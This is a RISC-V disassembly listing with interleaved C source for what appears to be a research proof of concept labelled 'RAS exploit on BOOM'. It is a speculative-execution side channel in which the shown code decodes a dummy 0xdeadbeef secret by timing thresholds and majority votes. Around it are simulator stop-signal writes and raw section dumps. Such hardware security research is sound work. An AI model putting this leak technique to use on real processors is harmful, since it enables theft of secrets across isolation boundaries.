    8020028c:	00379793          	sll	a5,a5,0x3
    80200290:	ff078793          	add	a5,a5,-16
    80200294:	008787b3          	add	a5,a5,s0
    80200298:	f507b783          	ld	a5,-176(a5)
    8020029c:	00078593          	mv	a1,a5
    802002a0:	00000517          	auipc	a0,0x0
    802002a4:	32050513          	add	a0,a0,800 # 802005c0 <main+0x454>
    802002a8:	ffe02097          	auipc	ra,0xffe02
    802002ac:	c20080e7          	jalr	-992(ra) # 80001ec8 <printf>
        for (int t = 0; t < TRIAL; t++) {
    802002b0:	fe842783          	lw	a5,-24(s0)
    802002b4:	0017879b          	addw	a5,a5,1
    802002b8:	fef42423          	sw	a5,-24(s0)
    802002bc:	fe842783          	lw	a5,-24(s0)
    802002c0:	0007871b          	sext.w	a4,a5
    802002c4:	00400793          	li	a5,4
    802002c8:	f4e7dae3          	bge	a5,a4,8020021c <main+0xb0>
        int sum = 0;
    802002cc:	fe042023          	sw	zero,-32(s0)
        for (int t = 0; t < TRIAL; t++) {
    802002d0:	fc042e23          	sw	zero,-36(s0)
    802002d4:	0380006f          	j	8020030c <main+0x1a0>
            if (cycles[t] > 560)
    802002d8:	fdc42783          	lw	a5,-36(s0)
    802002dc:	00379793          	sll	a5,a5,0x3
    802002e0:	ff078793          	add	a5,a5,-16
    802002e4:	008787b3          	add	a5,a5,s0
    802002e8:	f507b703          	ld	a4,-176(a5)
    802002ec:	23000793          	li	a5,560
    802002f0:	00e7f863          	bgeu	a5,a4,80200300 <main+0x194>
                sum++;
    802002f4:	fe042783          	lw	a5,-32(s0)
    802002f8:	0017879b          	addw	a5,a5,1
    802002fc:	fef42023          	sw	a5,-32(s0)
        for (int t = 0; t < TRIAL; t++) {
    80200300:	fdc42783          	lw	a5,-36(s0)
    80200304:	0017879b          	addw	a5,a5,1
    80200308:	fcf42e23          	sw	a5,-36(s0)
    8020030c:	fdc42783          	lw	a5,-36(s0)
    80200310:	0007871b          	sext.w	a4,a5
    80200314:	00400793          	li	a5,4
    80200318:	fce7d0e3          	bge	a5,a4,802002d8 <main+0x16c>
        bits[idx] = (sum > TRIAL/2)? 1:0;
    8020031c:	fe042783          	lw	a5,-32(s0)
    80200320:	0007871b          	sext.w	a4,a5
    80200324:	00200793          	li	a5,2
    80200328:	00e7a7b3          	slt	a5,a5,a4
    8020032c:	0ff7f793          	zext.b	a5,a5
    80200330:	00078713          	mv	a4,a5
    80200334:	fec42783          	lw	a5,-20(s0)
    80200338:	ff078793          	add	a5,a5,-16
    8020033c:	008787b3          	add	a5,a5,s0
    80200340:	f8e78c23          	sb	a4,-104(a5)
        votes[idx] = (sum > TRIAL/2)? sum: TRIAL - sum;
    80200344:	fe042783          	lw	a5,-32(s0)
    80200348:	0007871b          	sext.w	a4,a5
    8020034c:	00200793          	li	a5,2
    80200350:	00e7ce63          	blt	a5,a4,8020036c <main+0x200>
    80200354:	fe042783          	lw	a5,-32(s0)
    80200358:	0ff7f793          	zext.b	a5,a5
    8020035c:	00500713          	li	a4,5
    80200360:	40f707bb          	subw	a5,a4,a5
    80200364:	0ff7f793          	zext.b	a5,a5
    80200368:	00c0006f          	j	80200374 <main+0x208>
    8020036c:	fe042783          	lw	a5,-32(s0)
    80200370:	0ff7f793          	zext.b	a5,a5
    80200374:	fec42703          	lw	a4,-20(s0)
    80200378:	ff070713          	add	a4,a4,-16
    8020037c:	00870733          	add	a4,a4,s0
    80200380:	f6f70c23          	sb	a5,-136(a4)
        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
    80200384:	fec42783          	lw	a5,-20(s0)
    80200388:	ff078793          	add	a5,a5,-16
    8020038c:	008787b3          	add	a5,a5,s0
    80200390:	f987c783          	lbu	a5,-104(a5)
    80200394:	0007871b          	sext.w	a4,a5
    80200398:	fec42783          	lw	a5,-20(s0)
    8020039c:	ff078793          	add	a5,a5,-16
    802003a0:	008787b3          	add	a5,a5,s0
    802003a4:	f787c783          	lbu	a5,-136(a5)
    802003a8:	0007879b          	sext.w	a5,a5
    802003ac:	00500693          	li	a3,5
    802003b0:	00078613          	mv	a2,a5
    802003b4:	00070593          	mv	a1,a4
    802003b8:	00000517          	auipc	a0,0x0
    802003bc:	21050513          	add	a0,a0,528 # 802005c8 <main+0x45c>
    802003c0:	ffe02097          	auipc	ra,0xffe02
    802003c4:	b08080e7          	jalr	-1272(ra) # 80001ec8 <printf>
    for (int idx = S_WORD - 1; idx >= 0; idx--) {
    802003c8:	fec42783          	lw	a5,-20(s0)
    802003cc:	fff7879b          	addw	a5,a5,-1
    802003d0:	fef42623          	sw	a5,-20(s0)
    802003d4:	fec42783          	lw	a5,-20(s0)
    802003d8:	0007879b          	sext.w	a5,a5
    802003dc:	de07d6e3          	bgez	a5,802001c8 <main+0x5c>

    uint8_t *stopsig_addr = 0x60000000;
    802003e0:	600007b7          	lui	a5,0x60000
    802003e4:	fcf43423          	sd	a5,-56(s0)
    uint8_t *regdump_addr = 0x60000010;
    802003e8:	600007b7          	lui	a5,0x60000
    802003ec:	01078793          	add	a5,a5,16 # 60000010 <threadsense.2+0x5fffff8c>
    802003f0:	fcf43023          	sd	a5,-64(s0)
    uint8_t test = 0;
    802003f4:	fa040fa3          	sb	zero,-65(s0)
    *regdump_addr = test;
    802003f8:	fc043783          	ld	a5,-64(s0)
    802003fc:	fbf44703          	lbu	a4,-65(s0)
    80200400:	00e78023          	sb	a4,0(a5)
    asm volatile("fence\n");
    80200404:	0ff0000f          	fence
    *stopsig_addr = 0x0;
    80200408:	fc843783          	ld	a5,-56(s0)
    8020040c:	00078023          	sb	zero,0(a5)

    return 0;
    80200410:	00000793          	li	a5,0
}
    80200414:	00078513          	mv	a0,a5
    80200418:	0b813083          	ld	ra,184(sp)
    8020041c:	0b013403          	ld	s0,176(sp)
    80200420:	0c010113          	add	sp,sp,192
    80200424:	00008067          	ret

Disassembly of section .rodata:

0000000080200428 <.rodata>:
    80200428:	6e28                	.2byte	0x6e28
    8020042a:	6c75                	.2byte	0x6c75
    8020042c:	296c                	.2byte	0x296c
    8020042e:	0000                	.2byte	0x0
    80200430:	17fc                	.2byte	0x17fc
    80200432:	ffe0                	.2byte	0xffe0
    80200434:	1a5c                	.2byte	0x1a5c
    80200436:	ffe0                	.2byte	0xffe0
    80200438:	1a48                	.2byte	0x1a48
    8020043a:	ffe0                	.2byte	0xffe0
    8020043c:	1a5c                	.2byte	0x1a5c
    8020043e:	ffe0                	.2byte	0xffe0
    80200440:	1a5c                	.2byte	0x1a5c
    80200442:	ffe0                	.2byte	0xffe0
    80200444:	1a5c                	.2byte	0x1a5c
    80200446:	ffe0                	.2byte	0xffe0
    80200448:	1a5c                	.2byte	0x1a5c
    8020044a:	ffe0                	.2byte	0xffe0
    8020044c:	17d0                	.2byte	0x17d0
    8020044e:	ffe0                	.2byte	0xffe0
    80200450:	1a5c                	.2byte	0x1a5c
    80200452:	ffe0                	.2byte	0xffe0
    80200454:	1a5c                	.2byte	0x1a5c
    80200456:	ffe0                	.2byte	0xffe0
    80200458:	1754                	.2byte	0x1754
    8020045a:	ffe0                	.2byte	0xffe0
    8020045c:	17e8                	.2byte	0x17e8
    8020045e:	ffe0                	.2byte	0xffe0
    80200460:	1a5c                	.2byte	0x1a5c
    80200462:	ffe0                	.2byte	0xffe0
    80200464:	1760                	.2byte	0x1760
    80200466:	ffe0                	.2byte	0xffe0
    80200468:	176c                	.2byte	0x176c
    8020046a:	ffe0                	.2byte	0xffe0
    8020046c:	176c                	.2byte	0x176c
    8020046e:	ffe0                	.2byte	0xffe0
    80200470:	176c                	.2byte	0x176c
    80200472:	ffe0                	.2byte	0xffe0
    80200474:	176c                	.2byte	0x176c
    80200476:	ffe0                	.2byte	0xffe0
    80200478:	176c                	.2byte	0x176c
    8020047a:	ffe0                	.2byte	0xffe0
    8020047c:	176c                	.2byte	0x176c
    8020047e:	ffe0                	.2byte	0xffe0
    80200480:	176c                	.2byte	0x176c
    80200482:	ffe0                	.2byte	0xffe0
    80200484:	176c                	.2byte	0x176c
    80200486:	ffe0                	.2byte	0xffe0
    80200488:	176c                	.2byte	0x176c
    8020048a:	ffe0                	.2byte	0xffe0
    8020048c:	1a5c                	.2byte	0x1a5c
    8020048e:	ffe0                	.2byte	0xffe0
    80200490:	1a5c                	.2byte	0x1a5c
    80200492:	ffe0                	.2byte	0xffe0
    80200494:	1a5c                	.2byte	0x1a5c
    80200496:	ffe0                	.2byte	0xffe0
    80200498:	1a5c                	.2byte	0x1a5c
    8020049a:	ffe0                	.2byte	0xffe0
    8020049c:	1a5c                	.2byte	0x1a5c
    8020049e:	ffe0                	.2byte	0xffe0
    802004a0:	1a5c                	.2byte	0x1a5c
    802004a2:	ffe0                	.2byte	0xffe0
    802004a4:	1a5c                	.2byte	0x1a5c
    802004a6:	ffe0                	.2byte	0xffe0
    802004a8:	1a5c                	.2byte	0x1a5c
    802004aa:	ffe0                	.2byte	0xffe0
    802004ac:	1a5c                	.2byte	0x1a5c
    802004ae:	ffe0                	.2byte	0xffe0
    802004b0:	1a5c                	.2byte	0x1a5c
    802004b2:	ffe0                	.2byte	0xffe0
    802004b4:	1a5c                	.2byte	0x1a5c
    802004b6:	ffe0                	.2byte	0xffe0
    802004b8:	1a5c                	.2byte	0x1a5c
    802004ba:	ffe0                	.2byte	0xffe0
    802004bc:	1a5c                	.2byte	0x1a5c
    802004be:	ffe0                	.2byte	0xffe0
    802004c0:	1a5c                	.2byte	0x1a5c
    802004c2:	ffe0                	.2byte	0xffe0
    802004c4:	1a5c                	.2byte	0x1a5c
    802004c6:	ffe0                	.2byte	0xffe0
    802004c8:	1a5c                	.2byte	0x1a5c
    802004ca:	ffe0                	.2byte	0xffe0
    802004cc:	1a5c                	.2byte	0x1a5c
    802004ce:	ffe0                	.2byte	0xffe0
    802004d0:	1a5c                	.2byte	0x1a5c
    802004d2:	ffe0                	.2byte	0xffe0
    802004d4:	1a5c                	.2byte	0x1a5c
    802004d6:	ffe0                	.2byte	0xffe0
    802004d8:	1a5c                	.2byte	0x1a5c
    802004da:	ffe0                	.2byte	0xffe0
    802004dc:	1a5c                	.2byte	0x1a5c
    802004de:	ffe0                	.2byte	0xffe0
    802004e0:	1a5c                	.2byte	0x1a5c
    802004e2:	ffe0                	.2byte	0xffe0
    802004e4:	1a5c                	.2byte	0x1a5c
    802004e6:	ffe0                	.2byte	0xffe0
    802004e8:	1a5c                	.2byte	0x1a5c
    802004ea:	ffe0                	.2byte	0xffe0
    802004ec:	1a5c                	.2byte	0x1a5c
    802004ee:	ffe0                	.2byte	0xffe0
    802004f0:	1a5c                	.2byte	0x1a5c
    802004f2:	ffe0                	.2byte	0xffe0
    802004f4:	1a5c                	.2byte	0x1a5c
    802004f6:	ffe0                	.2byte	0xffe0
    802004f8:	1a5c                	.2byte	0x1a5c
    802004fa:	ffe0                	.2byte	0xffe0
    802004fc:	1a5c                	.2byte	0x1a5c
    802004fe:	ffe0                	.2byte	0xffe0
    80200500:	1a5c                	.2byte	0x1a5c
    80200502:	ffe0                	.2byte	0xffe0
    80200504:	1a5c                	.2byte	0x1a5c
    80200506:	ffe0                	.2byte	0xffe0
    80200508:	1a5c                	.2byte	0x1a5c
    8020050a:	ffe0                	.2byte	0xffe0
    8020050c:	1a5c                	.2byte	0x1a5c
    8020050e:	ffe0                	.2byte	0xffe0
    80200510:	1a5c                	.2byte	0x1a5c
    80200512:	ffe0                	.2byte	0xffe0
    80200514:	1a5c                	.2byte	0x1a5c
    80200516:	ffe0                	.2byte	0xffe0
    80200518:	1a5c                	.2byte	0x1a5c
    8020051a:	ffe0                	.2byte	0xffe0
    8020051c:	1a5c                	.2byte	0x1a5c
    8020051e:	ffe0                	.2byte	0xffe0
    80200520:	1a5c                	.2byte	0x1a5c
    80200522:	ffe0                	.2byte	0xffe0
    80200524:	1a5c                	.2byte	0x1a5c
    80200526:	ffe0                	.2byte	0xffe0
    80200528:	1a5c                	.2byte	0x1a5c
    8020052a:	ffe0                	.2byte	0xffe0
    8020052c:	1a5c                	.2byte	0x1a5c
    8020052e:	ffe0                	.2byte	0xffe0
    80200530:	183c                	.2byte	0x183c
    80200532:	ffe0                	.2byte	0xffe0
    80200534:	1978                	.2byte	0x1978
    80200536:	ffe0                	.2byte	0xffe0
    80200538:	1a5c                	.2byte	0x1a5c
    8020053a:	ffe0                	.2byte	0xffe0
    8020053c:	1a5c                	.2byte	0x1a5c
    8020053e:	ffe0                	.2byte	0xffe0
    80200540:	1a5c                	.2byte	0x1a5c
    80200542:	ffe0                	.2byte	0xffe0
    80200544:	1a5c                	.2byte	0x1a5c
    80200546:	ffe0                	.2byte	0xffe0
    80200548:	1a5c                	.2byte	0x1a5c
    8020054a:	ffe0                	.2byte	0xffe0
    8020054c:	1a5c                	.2byte	0x1a5c
    8020054e:	ffe0                	.2byte	0xffe0
    80200550:	1a5c                	.2byte	0x1a5c
    80200552:	ffe0                	.2byte	0xffe0
    80200554:	182c                	.2byte	0x182c
    80200556:	ffe0                	.2byte	0xffe0
    80200558:	1a5c                	.2byte	0x1a5c
    8020055a:	ffe0                	.2byte	0xffe0
    8020055c:	1a5c                	.2byte	0x1a5c
    8020055e:	ffe0                	.2byte	0xffe0
    80200560:	19d0                	.2byte	0x19d0
    80200562:	ffe0                	.2byte	0xffe0
    80200564:	19dc                	.2byte	0x19dc
    80200566:	ffe0                	.2byte	0xffe0
    80200568:	1a5c                	.2byte	0x1a5c
    8020056a:	ffe0                	.2byte	0xffe0
    8020056c:	1a5c                	.2byte	0x1a5c
    8020056e:	ffe0                	.2byte	0xffe0
    80200570:	1860                	.2byte	0x1860
    80200572:	ffe0                	.2byte	0xffe0
    80200574:	1a5c                	.2byte	0x1a5c
    80200576:	ffe0                	.2byte	0xffe0
    80200578:	19c4                	.2byte	0x19c4
    8020057a:	ffe0                	.2byte	0xffe0
    8020057c:	1a5c                	.2byte	0x1a5c
    8020057e:	ffe0                	.2byte	0xffe0
    80200580:	1a5c                	.2byte	0x1a5c
    80200582:	ffe0                	.2byte	0xffe0
    80200584:	1a04                	.2byte	0x1a04
    80200586:	ffe0                	.2byte	0xffe0
    80200588:	205d2a5b          	.4byte	0x205d2a5b
    8020058c:	4152                	.2byte	0x4152
    8020058e:	78652053          	.4byte	0x78652053
    80200592:	6c70                	.2byte	0x6c70
    80200594:	2074696f          	jal	s2,80246f9a <main+0x46e2e>
    80200598:	42206e6f          	jal	t3,802069ba <main+0x684e>
    8020059c:	0a4d4f4f          	fnmadd.d	ft10,fs10,ft4,ft1,rmm
	...
    802005a8:	6432255b          	.4byte	0x6432255b
    802005ac:	205d                	.2byte	0x205d
    802005ae:	746e6157          	.4byte	0x746e6157
    802005b2:	2528                	.2byte	0x2528
    802005b4:	2964                	.2byte	0x2964
    802005b6:	4320                	.2byte	0x4320
    802005b8:	6379                	.2byte	0x6379
    802005ba:	656c                	.2byte	0x656c
    802005bc:	00203a73          	csrrc	s4,frm,zero
    802005c0:	3425                	.2byte	0x3425
    802005c2:	646c                	.2byte	0x646c
    802005c4:	0020                	.2byte	0x20
    802005c6:	0000                	.2byte	0x0
    802005c8:	2d20                	.2byte	0x2d20
    802005ca:	3e2d                	.2byte	0x3e2d
    802005cc:	2520                	.2byte	0x2520
    802005ce:	2064                	.2byte	0x2064
    802005d0:	2528                	.2byte	0x2528
    802005d2:	2f64                	.2byte	0x2f64
    802005d4:	6425                	.2byte	0x6425
    802005d6:	0a29                	.2byte	0xa29
	...

Disassembly of section .data.secret:

0000000080400000 <secret>:
    80400000:	deadbeef          	jal	t4,803db5ea <main+0x1db47e>
    80400004:	0000                	.2byte	0x0
	...

Disassembly of section .tbss:

0000000080400040 <threadsense.2+0x803fffbc>:
	...

Disassembly of section .riscv.attributes:

0000000000000000 <.riscv.attributes>:
   0:	5141                	.2byte	0x5141
   2:	0000                	.2byte	0x0
   4:	7200                	.2byte	0x7200
   6:	7369                	.2byte	0x7369
   8:	01007663          	bgeu	zero,a6,14 <threadsense.5+0x14>
   c:	00000047          	fmsub.s	ft0,ft0,ft0,ft0,rne
  10:	1004                	.2byte	0x1004
  12:	7205                	.2byte	0x7205
  14:	3676                	.2byte	0x3676
  16:	6934                	.2byte	0x6934
  18:	7032                	.2byte	0x7032
  1a:	5f31                	.2byte	0x5f31
  1c:	326d                	.2byte	0x326d
  1e:	3070                	.2byte	0x3070
  20:	615f 7032 5f31      	.byte	0x5f, 0x61, 0x32, 0x70, 0x31, 0x5f
  26:	3266                	.2byte	0x3266
  28:	3270                	.2byte	0x3270
  2a:	645f 7032 5f32      	.byte	0x5f, 0x64, 0x32, 0x70, 0x32, 0x5f
  30:	697a                	.2byte	0x697a
  32:	32727363          	bgeu	tp,t2,358 <threadsense.2+0x2d4>
  36:	3070                	.2byte	0x3070
  38:	7a5f 6669 6e65      	.byte	0x5f, 0x7a, 0x69, 0x66, 0x65, 0x6e
  3e:	32696563          	bltu	s2,t1,368 <threadsense.2+0x2e4>
  42:	3070                	.2byte	0x3070
  44:	7a5f 6d6d 6c75      	.byte	0x5f, 0x7a, 0x6d, 0x6d, 0x75, 0x6c
  4a:	7031                	.2byte	0x7031
  4c:	0030                	.2byte	0x30
  4e:	0108                	.2byte	0x108
  50:	0b0a                	.2byte	0xb0a

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	3a434347          	fmsub.d	ft6,ft6,ft4,ft7,rmm
   4:	2820                	.2byte	0x2820
   6:	65653267          	.4byte	0x65653267
   a:	6535                	.2byte	0x6535
   c:	3334                	.2byte	0x3334
   e:	3030                	.2byte	0x3030
  10:	3831                	.2byte	0x3831
  12:	2029                	.2byte	0x2029
  14:	3231                	.2byte	0x3231
  16:	322e                	.2byte	0x322e
  18:	302e                	.2byte	0x302e
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
       0:	02bd                	.2byte	0x2bd
       2:	0000                	.2byte	0x0
       4:	0005                	.2byte	0x5
       6:	0008                	.2byte	0x8
       8:	002e                	.2byte	0x2e
       a:	0000                	.2byte	0x0
       c:	0101                	.2byte	0x101
       e:	fb01                	.2byte	0xfb01
      10:	0d0e                	.2byte	0xd0e
      12:	0100                	.2byte	0x100
      14:	0101                	.2byte	0x101
      16:	0001                	.2byte	0x1
      18:	0000                	.2byte	0x0
      1a:	0001                	.2byte	0x1
      1c:	0100                	.2byte	0x100
      1e:	0101                	.2byte	0x101
      20:	021f 0000 0000      	.byte	0x1f, 0x02, 0x00, 0x00, 0x00, 0x00
      26:	0036                	.2byte	0x36
      28:	0000                	.2byte	0x0
      2a:	0102                	.2byte	0x102
      2c:	021f 020f 003a      	.byte	0x1f, 0x02, 0x0f, 0x02, 0x3a, 0x00
      32:	0000                	.2byte	0x0
      34:	3a01                	.2byte	0x3a01
      36:	0000                	.2byte	0x0
      38:	0100                	.2byte	0x100
      3a:	0900                	.2byte	0x900
      3c:	0002                	.2byte	0x2
      3e:	0000                	.2byte	0x0
      40:	0080                	.2byte	0x80
      42:	0000                	.2byte	0x0
      44:	0300                	.2byte	0x300
      46:	0119                	.2byte	0x119
      48:	04090503          	lb	a0,64(s2)
      4c:	0100                	.2byte	0x100
      4e:	04090503          	lb	a0,64(s2)
      52:	0100                	.2byte	0x100
      54:	04090103          	lb	sp,64(s2)
      58:	0100                	.2byte	0x100
      5a:	08090103          	lb	sp,128(s2)
      5e:	0100                	.2byte	0x100
      60:	04090103          	lb	sp,64(s2)
      64:	0100                	.2byte	0x100
      66:	04090503          	lb	a0,64(s2)
      6a:	0100                	.2byte	0x100
      6c:	04090103          	lb	sp,64(s2)
      70:	0100                	.2byte	0x100
      72:	08090103          	lb	sp,128(s2)
      76:	0100                	.2byte	0x100
      78:	04090103          	lb	sp,64(s2)
      7c:	0100                	.2byte	0x100
      7e:	04090403          	lb	s0,64(s2)
      82:	0100                	.2byte	0x100
      84:	04090103          	lb	sp,64(s2)
      88:	0100                	.2byte	0x100
      8a:	04090303          	lb	t1,64(s2)
      8e:	0100                	.2byte	0x100
      90:	04090103          	lb	sp,64(s2)
      94:	0100                	.2byte	0x100
      96:	04090103          	lb	sp,64(s2)
      9a:	0100                	.2byte	0x100
      9c:	04090103          	lb	sp,64(s2)
      a0:	0100                	.2byte	0x100
      a2:	04090103          	lb	sp,64(s2)
      a6:	0100                	.2byte	0x100
      a8:	04090103          	lb	sp,64(s2)
      ac:	0100                	.2byte	0x100
      ae:	04090103          	lb	sp,64(s2)
      b2:	0100                	.2byte	0x100
      b4:	04090103          	lb	sp,64(s2)
      b8:	0100                	.2byte	0x100
      ba:	04090103          	lb	sp,64(s2)
      be:	0100                	.2byte	0x100
      c0:	04090103          	lb	sp,64(s2)
      c4:	0100                	.2byte	0x100
      c6:	04090103          	lb	sp,64(s2)
      ca:	0100                	.2byte	0x100
      cc:	04090103          	lb	sp,64(s2)
      d0:	0100                	.2byte	0x100
      d2:	04090103          	lb	sp,64(s2)
      d6:	0100                	.2byte	0x100
      d8:	04090103          	lb	sp,64(s2)
      dc:	0100                	.2byte	0x100
      de:	04090103          	lb	sp,64(s2)
      e2:	0100                	.2byte	0x100
      e4:	04090103          	lb	sp,64(s2)
      e8:	0100                	.2byte	0x100
      ea:	04090103          	lb	sp,64(s2)
      ee:	0100                	.2byte	0x100
      f0:	04090103          	lb	sp,64(s2)
      f4:	0100                	.2byte	0x100
      f6:	04090103          	lb	sp,64(s2)
      fa:	0100                	.2byte	0x100
      fc:	04090103          	lb	sp,64(s2)
     100:	0100                	.2byte	0x100
     102:	04090103          	lb	sp,64(s2)
     106:	0100                	.2byte	0x100
     108:	04090103          	lb	sp,64(s2)
     10c:	0100                	.2byte	0x100
     10e:	04090103          	lb	sp,64(s2)
     112:	0100                	.2byte	0x100
     114:	04090103          	lb	sp,64(s2)
     118:	0100                	.2byte	0x100
     11a:	04090103          	lb	sp,64(s2)
     11e:	0100                	.2byte	0x100
     120:	04090103          	lb	sp,64(s2)
     124:	0100                	.2byte	0x100
     126:	04090103          	lb	sp,64(s2)
     12a:	0100                	.2byte	0x100
     12c:	04090103          	lb	sp,64(s2)
     130:	0100                	.2byte	0x100
     132:	04090103          	lb	sp,64(s2)
     136:	0100                	.2byte	0x100
     138:	04090103          	lb	sp,64(s2)
     13c:	0100                	.2byte	0x100
     13e:	04090103          	lb	sp,64(s2)
     142:	0100                	.2byte	0x100
     144:	04090203          	lb	tp,64(s2)
     148:	0100                	.2byte	0x100
     14a:	04090103          	lb	sp,64(s2)
     14e:	0100                	.2byte	0x100
     150:	04090203          	lb	tp,64(s2)
     154:	0100                	.2byte	0x100
     156:	08090103          	lb	sp,128(s2)
     15a:	0100                	.2byte	0x100
     15c:	04090103          	lb	sp,64(s2)
     160:	0100                	.2byte	0x100
     162:	04090103          	lb	sp,64(s2)
     166:	0100                	.2byte	0x100
     168:	04090103          	lb	sp,64(s2)
     16c:	0100                	.2byte	0x100
     16e:	04090103          	lb	sp,64(s2)
     172:	0100                	.2byte	0x100
     174:	04090103          	lb	sp,64(s2)
     178:	0100                	.2byte	0x100
     17a:	04090103          	lb	sp,64(s2)
     17e:	0100                	.2byte	0x100
     180:	04090103          	lb	sp,64(s2)
     184:	0100                	.2byte	0x100
     186:	04090103          	lb	sp,64(s2)
     18a:	0100                	.2byte	0x100
     18c:	04090103          	lb	sp,64(s2)
     190:	0100                	.2byte	0x100
     192:	04090103          	lb	sp,64(s2)
     196:	0100                	.2byte	0x100
     198:	04090103          	lb	sp,64(s2)
     19c:	0100                	.2byte	0x100
     19e:	04090103          	lb	sp,64(s2)
     1a2:	0100                	.2byte	0x100
     1a4:	04090103          	lb	sp,64(s2)
     1a8:	0100                	.2byte	0x100
     1aa:	04090103          	lb	sp,64(s2)
     1ae:	0100                	.2byte	0x100
     1b0:	04090103          	lb	sp,64(s2)
     1b4:	0100                	.2byte	0x100
     1b6:	04090103          	lb	sp,64(s2)
     1ba:	0100                	.2byte	0x100
     1bc:	04090103          	lb	sp,64(s2)
     1c0:	0100                	.2byte	0x100
     1c2:	04090103          	lb	sp,64(s2)
     1c6:	0100                	.2byte	0x100
     1c8:	04090103          	lb	sp,64(s2)
     1cc:	0100                	.2byte	0x100
     1ce:	04090103          	lb	sp,64(s2)
     1d2:	0100                	.2byte	0x100
     1d4:	04090103          	lb	sp,64(s2)
     1d8:	0100                	.2byte	0x100
     1da:	04090103          	lb	sp,64(s2)
     1de:	0100                	.2byte	0x100
     1e0:	04090103          	lb	sp,64(s2)
     1e4:	0100                	.2byte	0x100
     1e6:	04090103          	lb	sp,64(s2)
     1ea:	0100                	.2byte	0x100
     1ec:	04090103          	lb	sp,64(s2)
     1f0:	0100                	.2byte	0x100
     1f2:	04090103          	lb	sp,64(s2)
     1f6:	0100                	.2byte	0x100
     1f8:	04090103          	lb	sp,64(s2)
     1fc:	0100                	.2byte	0x100
     1fe:	04090103          	lb	sp,64(s2)
     202:	0100                	.2byte	0x100
     204:	04090103          	lb	sp,64(s2)
     208:	0100                	.2byte	0x100
     20a:	04090103          	lb	sp,64(s2)
     20e:	0100                	.2byte	0x100
     210:	04090103          	lb	sp,64(s2)
     214:	0100                	.2byte	0x100
     216:	04090103          	lb	sp,64(s2)
     21a:	0100                	.2byte	0x100
     21c:	04090303          	lb	t1,64(s2)
     220:	0100                	.2byte	0x100
     222:	08090103          	lb	sp,128(s2)
     226:	0100                	.2byte	0x100
     228:	04090103          	lb	sp,64(s2)
     22c:	0100                	.2byte	0x100
     22e:	08090103          	lb	sp,128(s2)
     232:	0100                	.2byte	0x100
     234:	04090203          	lb	tp,64(s2)
     238:	0100                	.2byte	0x100
     23a:	08090103          	lb	sp,128(s2)
     23e:	0100                	.2byte	0x100
     240:	08090303          	lb	t1,128(s2)
     244:	0100                	.2byte	0x100
     246:	04090103          	lb	sp,64(s2)
     24a:	0100                	.2byte	0x100
     24c:	04090303          	lb	t1,64(s2)
     250:	0100                	.2byte	0x100
     252:	04090103          	lb	sp,64(s2)
     256:	0100                	.2byte	0x100
     258:	04090303          	lb	t1,64(s2)
     25c:	0100                	.2byte	0x100
     25e:	04090203          	lb	tp,64(s2)
     262:	0100                	.2byte	0x100
     264:	08090103          	lb	sp,128(s2)
     268:	0100                	.2byte	0x100
     26a:	04090303          	lb	t1,64(s2)
     26e:	0100                	.2byte	0x100
     270:	08090103          	lb	sp,128(s2)
     274:	0100                	.2byte	0x100
     276:	04090203          	lb	tp,64(s2)
     27a:	0100                	.2byte	0x100
     27c:	08090103          	lb	sp,128(s2)
     280:	0100                	.2byte	0x100
     282:	04090103          	lb	sp,64(s2)
     286:	0100                	.2byte	0x100
     288:	08090203          	lb	tp,128(s2)
     28c:	0100                	.2byte	0x100
     28e:	08090103          	lb	sp,128(s2)
     292:	0100                	.2byte	0x100
     294:	04090103          	lb	sp,64(s2)
     298:	0100                	.2byte	0x100
     29a:	0409                	.2byte	0x409
     29c:	0000                	.2byte	0x0
     29e:	0101                	.2byte	0x101
     2a0:	0900                	.2byte	0x900
     2a2:	0002                	.2byte	0x2
     2a4:	2000                	.2byte	0x2000
     2a6:	0080                	.2byte	0x80
     2a8:	0000                	.2byte	0x0
     2aa:	0300                	.2byte	0x300
     2ac:	01ad                	.2byte	0x1ad
     2ae:	0301                	.2byte	0x301
     2b0:	0902                	.2byte	0x902
     2b2:	0004                	.2byte	0x4
     2b4:	0301                	.2byte	0x301
     2b6:	0901                	.2byte	0x901
     2b8:	0008                	.2byte	0x8
     2ba:	0901                	.2byte	0x901
     2bc:	0004                	.2byte	0x4
     2be:	0100                	.2byte	0x100
     2c0:	8201                	.2byte	0x8201
     2c2:	0000                	.2byte	0x0
     2c4:	0500                	.2byte	0x500
     2c6:	0800                	.2byte	0x800
     2c8:	4000                	.2byte	0x4000
     2ca:	0000                	.2byte	0x0
     2cc:	0100                	.2byte	0x100
     2ce:	0101                	.2byte	0x101
     2d0:	000d0efb          	.4byte	0xd0efb
     2d4:	0101                	.2byte	0x101
     2d6:	0101                	.2byte	0x101
     2d8:	0000                	.2byte	0x0
     2da:	0100                	.2byte	0x100
     2dc:	0000                	.2byte	0x0
     2de:	0101                	.2byte	0x101
     2e0:	1f01                	.2byte	0x1f01
     2e2:	0004                	.2byte	0x4
     2e4:	0000                	.2byte	0x0
     2e6:	3600                	.2byte	0x3600
     2e8:	0000                	.2byte	0x0
     2ea:	4c00                	.2byte	0x4c00
     2ec:	0000                	.2byte	0x0
     2ee:	8b00                	.2byte	0x8b00
     2f0:	0000                	.2byte	0x0
     2f2:	0200                	.2byte	0x200
     2f4:	1f01                	.2byte	0x1f01
     2f6:	0f02                	.2byte	0xf02
     2f8:	4604                	.2byte	0x4604
     2fa:	0000                	.2byte	0x0
     2fc:	0100                	.2byte	0x100
     2fe:	0046                	.2byte	0x46
     300:	0000                	.2byte	0x0
     302:	c601                	.2byte	0xc601
     304:	0000                	.2byte	0x0
     306:	0200                	.2byte	0x200
     308:	000000d7          	.4byte	0xd7
     30c:	00110503          	lb	a0,1(sp)
     310:	0209                	.2byte	0x209
     312:	1048                	.2byte	0x1048
     314:	8000                	.2byte	0x8000
     316:	0000                	.2byte	0x0
     318:	0000                	.2byte	0x0
     31a:	05010903          	lb	s2,80(sp)
     31e:	0902030f          	.4byte	0x902030f
     322:	000c                	.2byte	0xc
     324:	0301                	.2byte	0x301
     326:	0901                	.2byte	0x901
     328:	0008                	.2byte	0x8
     32a:	0501                	.2byte	0x501
     32c:	0305                	.2byte	0x305
     32e:	0901                	.2byte	0x901
     330:	000c                	.2byte	0xc
     332:	0301                	.2byte	0x301
     334:	0911                	.2byte	0x911
     336:	0028                	.2byte	0x28
     338:	0501                	.2byte	0x501
     33a:	0301                	.2byte	0x301
     33c:	0901                	.2byte	0x901
     33e:	0004                	.2byte	0x4
     340:	0901                	.2byte	0x901
